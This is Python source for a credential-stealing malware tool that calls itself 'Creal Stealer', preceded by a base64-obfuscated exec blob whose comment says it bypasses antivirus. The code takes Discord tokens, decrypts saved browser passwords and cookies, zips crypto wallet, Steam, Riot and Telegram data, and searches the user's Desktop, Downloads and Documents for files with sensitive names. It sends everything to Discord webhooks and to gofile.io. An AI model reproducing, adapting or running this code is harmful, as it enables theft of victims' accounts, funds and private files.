BceDY5XHg2Y1x4NjUnXShnbG9iYWxzKClbJ1x4NzNceDc0XHg3MiddKCJceDY3XHg2Y1x4NmZceDYyXHg2MVx4NmNceDczXHgyOFx4MjlceDViXHgyN1x4NWNceDc4XHgzNlx4MzVceDVjXHg3OFx4MzdceDM2XHg1Y1x4NzhceDM2XHgzMVx4NWNceDc4XHgzNlx4NjNceDI3XHg1ZChJSklMSUpMTExKSkpKSUxKSkopIiksZmlsZW5hbWU9J1x4NzhceDc4XHg3N1x4NzdceDc4XHg3OFx4NzdceDc3XHg3OFx4NzhceDc4XHg3OFx4NzdceDc4XHg3N1x4NzdceDc4XHg3OFx4NzgnLG1vZGU9J1x4NjVceDc2XHg2MVx4NmMnKSkpKCdceDVmXHg1Zlx4NjlceDZkXHg3MFx4NmZceDcyXHg3NFx4NWZceDVmXHgyOFx4MjdceDYyXHg3NVx4NjlceDZjXHg3NFx4NjlceDZlXHg3M1x4MjdceDI5XHgyZVx4NjVceDc4XHg2NVx4NjMnKSkKICAgICAgICBJbnZlcnQoQ2VpbCA9IDI3NTE2IC0gLTQ2MDE3KS5TeXN0ZW0oX2RldGVjdHZhciA9IC0zNTczNyAvIE5lZ2F0aXZlLlN1YnN0cmFjdCkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgO0pMSkpJSUpJTElKSkxKTExKTElJSUxJSSgpKGxJbElJbElsbElJSUlsbElJbGxsSWwoamlpamxpbGlqaWpqamlpaWxqamlqbGooSWxsSWxJbElJbElsbGxJbElJbGwoSUxJTExMSUpJTElKSUxMTEpKSkxKTElJTCgnXHg3Nlx4NjFceDcyXHg3MycpKSksSW52ZXJ0LlN0YXRpc3RpY3MoTWVtb3J5QWNjZXNzPSdPb29PTzBvMG8wTzBPMG9vT08wb28nKSkpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBfd2FsazoKICAgICAgICBpZiAzODI4NDUgPiAyMDk3Njc5OgogICAgICAgICAgICBJbnZlcnQuZXhlY3V0ZShjb2RlID0gVGhlb3J5KF93YWxrKSkKCiAgICAgICAgZWxpZiAxMTkyNzEgPiAzNjE5Nzg3OgogICAgICAgICAgICBOZWdhdGl2ZS5XYWxrKF9jdWJlID0gTmVnYXRpdmUuU3Vic3RyYWN0ICsgLTcwMzIxKQ=="),'<string>','exec'))#don't delete this a code to bypass anti viruses


def uploadToken(token, path):
    global hook
    global tgmkx
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == '': friends = "```No Rare Friends```"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = "```None```"

    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 0000000,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{token}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{email}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{phone}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{getip()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
        "username": "Creal Stealer",
        "attachments": []
        }
    urlopen(Request(tgmkx, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "wpcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                    }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
            "attachments": []
            }
        urlopen(Request(tgmkx, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "wppassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                    }
                }
            ],
            "username": "Creal",
            "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
            "attachments": []
            }
        urlopen(Request(tgmkx, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 000000,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Creal | File Stealer"
                },
                "footer": {
                    "text": "Creal Stealer",
                    "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
            "attachments": []
            }
        urlopen(Request(tgmkx, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return




# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
    _




def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Creal STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'passw')

Cookies = []    
def getCookie(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            Cookies.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
            CookiCount += 1
    writeforfile(Cookies, 'cook')

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Creal Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 000000,
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
            }
            }
        ],
        "username": "Creal Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
        "attachments": []
    }
    urlopen(Request(tgmkx, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)
